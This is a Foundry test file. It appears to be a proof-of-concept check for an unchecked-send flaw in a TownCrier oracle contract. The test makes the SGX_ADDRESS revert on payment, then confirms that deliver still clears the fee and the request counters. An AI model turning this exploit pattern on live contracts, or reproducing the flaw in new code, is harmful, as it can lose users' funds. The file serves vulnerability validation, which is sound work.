// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x89c1b3807d4c67df034fffb62f3509561218d30b.sol";

contract Reverter {
    fallback() external payable {
        revert("Reverting on receive");
    }
}

contract TownCrierTest is Test {
    TownCrier townCrier;
    Reverter reverter;
    address owner = makeAddr("owner");
    address user = makeAddr("user");
    uint64 requestId;

    function setUp() public {
        vm.startPrank(owner);
        townCrier = new TownCrier();
        reverter = new Reverter();
        vm.stopPrank();
    }

    function testUncheckedSendVulnerability() public {
        // Configure fees
        vm.prank(owner);
        townCrier.reset(1, 100000, 10000); // Set GAS_PRICE=1, MIN_FEE=100000, CANCELLATION_FEE=10000

        // Create request
        uint8 requestType = 0;
        address callbackAddr = address(0);
        bytes4 callbackFID = bytes4(0);
        uint timestamp = block.timestamp;
        bytes32[] memory requestData = new bytes32[](1);
        requestData[0] = bytes32(0);
        
        vm.deal(user, 100000);
        vm.prank(user);
        int requestResult = townCrier.request{value: 100000}(
            requestType,
            callbackAddr,
            callbackFID,
            timestamp,
            requestData
        );
        requestId = uint64(uint256(requestResult));

        // Cancel request to trigger cancellation fee branch
        vm.prank(user);
        int cancelResult = townCrier.cancel(requestId);
        assertEq(cancelResult, townCrier.SUCCESS_FLAG(), "Cancel should succeed");

        // Make SGX_ADDRESS revert on receive
        address SGX_ADDRESS = townCrier.SGX_ADDRESS();
        vm.etch(SGX_ADDRESS, address(reverter).code);

        // --- DIFFERENTIAL STATE SNAPSHOT (Pre-deliver) ---
        console2.log("--- BEFORE-Trigger (deliver) ---");
        (, uint feeBefore, , , ) = townCrier.requests(requestId);
        uint unrespondedBefore = townCrier.unrespondedCnt();
        uint sgxBalanceBefore = address(SGX_ADDRESS).balance;
        uint contractBalanceBefore = address(townCrier).balance;
        console2.log("Request fee (before):", feeBefore);
        console2.log("Unresponded count (before):", unrespondedBefore);
        console2.log("SGX_ADDRESS balance (before): %d wei", sgxBalanceBefore);
        console2.log("Contract balance (before): %d wei", contractBalanceBefore);

        // --- TRIGGER OPERATION ---
        console2.log("--- Trigger (deliver) ---");
        vm.prank(SGX_ADDRESS);
        bytes32 paramsHash = keccak256(abi.encodePacked(requestType, requestData));
        townCrier.deliver(requestId, paramsHash, 0, bytes32(0));

        // --- DIFFERENTIAL STATE SNAPSHOT (Post-deliver) ---
        console2.log("--- AFTER-Trigger (deliver) ---");
        (, uint feeAfter, , , ) = townCrier.requests(requestId);
        uint unrespondedAfter = townCrier.unrespondedCnt();
        uint sgxBalanceAfter = address(SGX_ADDRESS).balance;
        uint contractBalanceAfter = address(townCrier).balance;
        console2.log("Request fee (after):", feeAfter);
        console2.log("Unresponded count (after):", unrespondedAfter);
        console2.log("SGX_ADDRESS balance (after): %d wei", sgxBalanceAfter);
        console2.log("Contract balance (after): %d wei", contractBalanceAfter);

        // --- STATE CHANGE ANALYSIS ---
        console2.log("--- Vulnerability Validation ---");
        bool feeChanged = (feeAfter != feeBefore);
        bool unrespondedChanged = (unrespondedAfter != unrespondedBefore);
        bool sgxBalanceChanged = (sgxBalanceAfter != sgxBalanceBefore);
        bool contractBalanceChanged = (contractBalanceAfter != contractBalanceBefore);
        bool unauthorizedStateChange = feeChanged || unrespondedChanged || sgxBalanceChanged || contractBalanceChanged;
        
        console2.log("Request fee changed:", feeChanged ? "YES" : "NO");
        console2.log("Unresponded count changed:", unrespondedChanged ? "YES" : "NO");
        console2.log("SGX balance changed:", sgxBalanceChanged ? "YES" : "NO");
        console2.log("Contract balance changed:", contractBalanceChanged ? "YES" : "NO");
        console2.log("Unauthorized state change:", unauthorizedStateChange ? "CONFIRMED" : "DENIED");
        
        // --- FINAL VULNERABILITY VERDICT ---
        if (unauthorizedStateChange) {
            console2.log("Vulnerability Exists: State modified despite SGX_ADDRESS revert");
        } else {
            console2.log("Vulnerability not Exist: No state alteration detected");
        }

        // Original assertions
        assertEq(feeAfter, 0, "Fee should be marked as delivered (0)");
        assertEq(townCrier.unrespondedCnt(), 0, "Unresponded count should be 0");
    }
}